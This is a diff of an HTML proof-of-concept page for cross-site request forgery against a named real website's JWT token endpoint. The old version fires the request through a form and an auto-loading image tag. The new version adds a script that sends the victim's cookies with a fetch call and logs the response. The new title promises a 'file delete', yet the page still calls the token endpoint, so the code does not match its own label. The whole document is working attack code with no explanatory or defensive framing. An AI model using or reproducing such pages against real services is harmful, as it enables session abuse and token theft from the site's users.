@@ -1,21 +1,26 @@
-<!-- csrf-get-datacamp.html -->
 <!doctype html>
-<html lang="en">
+<html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - GET /api/jwt/token</title>
+  <title>CSRF PoC - AJAX GET Delete</title>
 </head>
 <body>
-  <h2>CSRF PoC - GET Request to /api/jwt/token</h2>
+  <h2>CSRF PoC - Trigger File Delete</h2>
+  <button onclick="exploit()">Trigger Delete</button>
 
-  <p>Click the button below to manually trigger the request:</p>
-  <form action="https://www.datacamp.com/api/jwt/token" method="GET" target="_blank">
-    <input type="submit" value="Send CSRF GET Request">
-  </form>
-
-  <hr>
-
-  <p>Or auto-trigger when the image loads:</p>
-  <img src="https://www.datacamp.com/api/jwt/token" alt="CSRF Request">
+  <script>
+    function exploit() {
+      fetch("https://www.datacamp.com/api/jwt/token", {
+        method: "GET",
+        credentials: "include", // send victim cookies
+        headers: {
+          "X-Requested-With": "XMLHttpRequest",
+          "Accept": "application/json, text/plain, */*"
+        }
+      })
+      .then(r => r.text())
+      .then(console.log);
+    }
+  </script>
 </body>
 </html>
